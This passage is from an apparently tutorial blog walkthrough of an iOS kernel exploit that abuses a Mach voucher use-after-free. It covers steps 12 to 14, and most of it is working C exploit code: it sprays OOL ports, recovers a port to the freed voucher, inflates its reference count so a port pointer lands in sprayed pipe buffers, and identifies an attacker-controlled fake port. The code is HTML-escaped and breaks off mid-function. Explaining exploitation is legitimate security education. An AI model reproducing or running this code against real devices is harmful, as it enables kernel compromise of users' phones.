    	&lt;span class=&quot;n&quot;&gt;ool_descriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;ool_descriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;deallocate&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;ool_descriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copy&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_PHYSICAL_COPY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;ool_descriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_descriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Send the messages.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;messages_sent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;messages_sent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;messages_sent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    				&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    				&lt;span class=&quot;n&quot;&gt;MACH_SEND_MSG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_OPTION_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    				&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    				&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    				&lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    				&lt;span class=&quot;n&quot;&gt;MACH_MSG_TIMEOUT_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    				&lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s returned %d: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mach_msg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-12-call-thread_get_mach_voucher-to-get-a-voucher-port-for-the-freed-voucher&quot;&gt;Step 12: Call thread_get_mach_voucher() to get a voucher port for the freed voucher&lt;/h4&gt;

&lt;p&gt;Using &lt;strong&gt;thread_get_mach_voucher&lt;/strong&gt;, we can recover the voucher port for the freed voucher, and this will allow us to further manipulate the reference count of the voucher.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    	&lt;span class=&quot;c1&quot;&gt;// 12\. Once we've reallocated the voucher with an OOL ports allocation, the iv_refs field&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// will overlap with the lower 32 bits of the pointer to base_port. If base_port's address&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// is low enough, this tricks the kernel into thinking that the reference count is valid,&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// allowing us to call thread_get_mach_voucher() without panicking. And since the OOL ports&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// pattern overwrote the voucher's iv_port field with MACH_PORT_NULL,&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// convert_voucher_to_port() will go ahead and allocate a fresh voucher port through which&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// we can manipulate our freed voucher while it still overlaps our OOL ports.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_get_mach_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uaf_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s returned %d: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;could not get a voucher port to the freed voucher; reallocation failed?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_PORT_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uaf_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;freed voucher port 0x%x is not valid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uaf_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;recovered voucher port 0x%x for freed voucher&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uaf_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-13-modify-the-iv_refs-to-point-to-pipe-buffers&quot;&gt;Step 13: Modify the iv_refs to point to pipe buffers&lt;/h4&gt;

&lt;p&gt;Using the voucher port, we can modify the &lt;strong&gt;iv_refs&lt;/strong&gt; value using the same vulnerability (reference leak this time) and hope that it points to our pipe buffers. If you recall from before, the &lt;strong&gt;iv_refs&lt;/strong&gt; was actually pointing to the base port. So now the &lt;strong&gt;iv_refs&lt;/strong&gt; pointer is incremented by &lt;strong&gt;4MB&lt;/strong&gt; (&lt;strong&gt;base_port_to_fake_port_offset&lt;/strong&gt;) in this case, and if you remember we sprayed about &lt;strong&gt;16MB&lt;/strong&gt; of Pipe buffers, so the Port pointer should overlap somewhere within our sprayed Pipe buffers.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 13\. Alright, we've pushed through the first risky part! We now have a voucher port that&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// refers to a voucher that overlaps with our OOL ports spray. Our next step is to modify&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// the voucher's iv_refs field using the reference counting bugs so that the ipc_port&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// pointer it overlaps with now points into our pipe buffers. That way, when we receive the&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// message, we'll get a send right to a fake IPC port object whose contents we control.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;adding references to the freed voucher to change the OOL port pointer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_port_to_fake_port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;voucher_reference&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uaf_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_set_mach_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;could not clear thread voucher&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// This is a horrible fix, since ith_voucher still points to the freed voucher, but&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// at least it'll make the OOL port pointer correct so the exploit can continue.&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;voucher_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uaf_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-14-identify-voucher-port-and-overlapping-fake-port&quot;&gt;Step 14: Identify Voucher Port and overlapping fake port&lt;/h4&gt;

&lt;p&gt;Now since the freed voucher (which is actually overlapped with port pointers) has an &lt;strong&gt;iv_refs&lt;/strong&gt; pointer pointing to somewhere within the pipe buffers, we need to find out which of the &lt;strong&gt;1024&lt;/strong&gt; pipe buffers is it. In order to do that, we receive the messages that we sent earlier using &lt;strong&gt;OOL&lt;/strong&gt; Ports descriptor. We loop through all the descriptors in the message and pass them to a handler block with the parameter as the starting ports address and the total number of ports. Then we loop through each of these port pointers as vouchers using a helper function &lt;strong&gt;iterate_ipc_vouchers_via_mach_ports&lt;/strong&gt; that gives out address of all possible vouchers by dividing the size of all port pointers by voucher size. The &lt;strong&gt;ool_voucher_port&lt;/strong&gt; can be identified because it will have a valid voucher port, since we called &lt;strong&gt;thread_get_mach_voucher()&lt;/strong&gt; only on that voucher, and also by checking against &lt;strong&gt;uaf_voucher_port&lt;/strong&gt; at an offset of &lt;strong&gt;7&lt;/strong&gt; when looping as port pointers, since its &lt;strong&gt;7*8&lt;/strong&gt; which is 56 bytes (offset of &lt;strong&gt;iv_port&lt;/strong&gt;) in the voucher struct. The fake port is identified simply as the value pointing to the &lt;strong&gt;iv_refs&lt;/strong&gt; which is at an offset of &lt;strong&gt;0x8&lt;/strong&gt; and hence index &lt;strong&gt;1&lt;/strong&gt; when using port pointers.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 14\. Now receive the OOL ports and recover our voucher port and the fake port that&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// overlaps our pipe buffers. This is where we're most likely to panic if the port/pipe&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// groom failed and the overlapping OOL port pointer does not point into our pipe buffers.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;receiving the OOL ports will leak port 0x%x&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;ool_ports_spray_receive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_holding_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_holding_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unexpected OOL ports count %zu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// Loop through each of the possible voucher positions in the OOL ports looking for&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// a sign that this is where the voucher overlaps.&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;iterate_ipc_vouchers_via_mach_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    			&lt;span class=&quot;c1&quot;&gt;// We're checking to see whether index 7 (which was MACH_PORT_NULL when we&lt;/span&gt;
    			&lt;span class=&quot;c1&quot;&gt;// sent the message) now contains a port. If it does, that means that this&lt;/span&gt;
    			&lt;span class=&quot;c1&quot;&gt;// segment of the OOL ports overlapped with the freed voucher, and so when&lt;/span&gt;
    			&lt;span class=&quot;c1&quot;&gt;// we called thread_get_mach_voucher() above, the iv_port field was set to&lt;/span&gt;
    			&lt;span class=&quot;c1&quot;&gt;// the newly allocated voucher port (which is what we're receiving now).&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_voucher_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_voucher_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    				&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;received voucher port 0x%x in OOL ports&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    				&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;voucher overlapped at offset 0x%zx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    						&lt;span class=&quot;n&quot;&gt;voucher_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_voucher_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uaf_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    					&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;voucher port mismatch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    					&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;multiple fake ports&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    				&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
